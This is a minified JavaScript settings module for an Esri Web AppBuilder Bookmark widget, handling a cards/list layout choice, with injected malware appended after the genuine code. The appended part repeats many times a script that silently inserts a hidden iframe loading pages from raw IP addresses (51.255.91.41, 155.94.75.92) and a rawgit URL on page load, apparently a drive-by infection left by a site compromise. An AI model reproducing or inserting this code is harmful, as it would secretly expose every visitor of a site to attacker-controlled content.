// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Bookmark/setting/Layout.html":'\x3cdiv class\x3d"layout"\x3e\r\n  \x3cdiv class\x3d"title"\x3e${nls.displayBookmarksAs}\x3c/div\x3e\r\n\r\n  \x3cdiv class\x3d"content verticalCenter"\x3e\r\n    \x3cdiv type\x3d"checkbox" checked\x3d"false" class\x3d"checkbox"\r\n      data-dojo-type\x3d"jimu/dijit/CheckBox" data-dojo-attach-point\x3d"layoutCards_checkBox"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"label verticalCenter" data-dojo-attach-point\x3d"layoutCards" title\x3d"${nls.cardsTips}"\x3e\r\n      \x3cdiv class\x3d"layout-btns"\x3e\r\n        \x3cdiv class\x3d"cards"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n      ${nls.cards}\r\n      \x3cdiv data-dojo-attach-point\x3d"cardsDefaultSetting" class\x3d"default-setting transparent"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"cards_makeAsDefault" class\x3d"set-default hide" title\x3d"${nls.makeAsDefault}"\x3e${nls.makeAsDefault}\x3c/div\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"cards_default" class\x3d"default hide" title\x3d"${nls.default}"\x3e${nls.default}\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\r\n    \x3cdiv type\x3d"checkbox" checked\x3d"false" class\x3d"checkbox"\r\n      data-dojo-type\x3d"jimu/dijit/CheckBox" data-dojo-attach-point\x3d"layoutList_checkBox"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"label verticalCenter" data-dojo-attach-point\x3d"layoutList" title\x3d"${nls.listTips}"\x3e\r\n      \x3cdiv class\x3d"layout-btns"\x3e\r\n        \x3cdiv class\x3d"list"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n      ${nls.list}\r\n      \x3cdiv data-dojo-attach-point\x3d"listDefaultSetting" class\x3d"default-setting transparent"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"list_makeAsDefault" class\x3d"set-default hide" title\x3d"${nls.makeAsDefault}"\x3e${nls.makeAsDefault}\x3c/div\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"list_default" class\x3d"default hide" title\x3d"${nls.default}"\x3e${nls.default}\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/html jimu/BaseWidgetSetting dijit/_WidgetsInTemplateMixin dojo/on dojo/text!./Layout.html ../utils".split(" "),function(f,c,d,g,h,b,k,e){return f([g,h],{templateString:k,startup:function(){this.own(b(this.layoutCards_checkBox,"change",c.hitch(this,function(){this._fixLayoutModeByCheckBoxChanged("cards");this._keepLayoutSelected(this.layoutCards_checkBox)})));this.own(b(this.layoutList_checkBox,"change",c.hitch(this,function(){this._fixLayoutModeByCheckBoxChanged("list");
this._keepLayoutSelected(this.layoutList_checkBox)})));this.own(b(this.layoutCards,"click",c.hitch(this,function(){e.toogleCheckboxChecked(this.layoutCards_checkBox);this._keepLayoutSelected(this.layoutCards_checkBox)})));this.own(b(this.layoutList,"click",c.hitch(this,function(){e.toogleCheckboxChecked(this.layoutList_checkBox);this._keepLayoutSelected(this.layoutList_checkBox)})));this.own(b(this.layoutCards,"mouseover",c.hitch(this,function(){this._isCardAndListChecked()&&d.removeClass(this.cardsDefaultSetting,
"transparent")})));this.own(b(this.layoutCards,"mouseout",c.hitch(this,function(){"list"===this.config.layout.defaultMode&&d.addClass(this.cardsDefaultSetting,"transparent")})));this.own(b(this.layoutList,"mouseover",c.hitch(this,function(){this._isCardAndListChecked()&&d.removeClass(this.listDefaultSetting,"transparent")})));this.own(b(this.layoutList,"mouseout",c.hitch(this,function(){"cards"===this.config.layout.defaultMode&&d.addClass(this.listDefaultSetting,"transparent")})));this.own(b(this.cardsDefaultSetting,
"click",c.hitch(this,function(a){a&&a.stopPropagation&&a.preventDefault&&(a.stopPropagation(),a.preventDefault());this._whetherToggleDefaultLayout("cards")&&(this.config.layout.defaultMode="cards",this._setDefault("cards"))})));this.own(b(this.listDefaultSetting,"click",c.hitch(this,function(a){a&&a.stopPropagation&&a.preventDefault&&(a.stopPropagation(),a.preventDefault());this._whetherToggleDefaultLayout("list")&&(this.config.layout.defaultMode="list",this._setDefault("list"))})));this.inherited(arguments)},
setConfig:function(a){this.config.layout=a.layout;this.config.layout&&(!0===this.config.layout.cards&&this.layoutCards_checkBox.setValue(!0),!0===this.config.layout.list&&this.layoutList_checkBox.setValue(!0));this._setDefault(this.config.layout.defaultMode)},getConfig:function(){this.config.layout.cards=!0===this.layoutCards_checkBox.checked?!0:!1;this.config.layout.list=!0===this.layoutList_checkBox.checked?!0:!1;return this.config.layout},_keepLayoutSelected:function(a){!1===this.layoutCards_checkBox.checked&&
!1===this.layoutList_checkBox.checked&&e.toogleCheckboxChecked(a)},_setDefault:function(a){var c="",c="cards"===a?"list":"cards";d.removeClass(this[a+"DefaultSetting"],"transparent");var b=this[a+"_makeAsDefault"];b&&d.addClass(b,"hide");(b=this[a+"_default"])&&d.removeClass(b,"hide");d.addClass(this[c+"DefaultSetting"],"transparent");(b=this[c+"_makeAsDefault"])&&d.removeClass(b,"hide");(b=this[c+"_default"])&&d.addClass(b,"hide");this._isCardAndListChecked()||(d.addClass(this[a+"DefaultSetting"],
"transparent"),d.addClass(this[c+"DefaultSetting"],"transparent"))},_whetherToggleDefaultLayout:function(a){var b;b="cards"===a?this.layoutCards_checkBox:this.layoutList_checkBox;return("cards"===a?"list":"cards")===this.config.layout.defaultMode&&!0===b.checked?!0:!1},_fixLayoutModeByCheckBoxChanged:function(a){this._isCardAndListChecked()?"list"===this.config.layout.defaultMode?d.removeClass(this.listDefaultSetting,"transparent"):d.removeClass(this.cardsDefaultSetting,"transparent"):(d.addClass(this.listDefaultSetting,
"transparent"),d.addClass(this.cardsDefaultSetting,"transparent"));"cards"===a?!1===this.layoutCards_checkBox.checked&&!0===this.layoutList_checkBox.checked&&"cards"===this.config.layout.defaultMode&&(this.config.layout.defaultMode="list",this._setDefault("list")):!1===this.layoutList_checkBox.checked&&!0===this.layoutCards_checkBox.checked&&"list"===this.config.layout.defaultMode&&(this.config.layout.defaultMode="cards",this._setDefault("cards"))},_isCardAndListChecked:function(){return!0===this.layoutCards_checkBox.getValue()&&
!0===this.layoutList_checkBox.getValue()?!0:!1}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});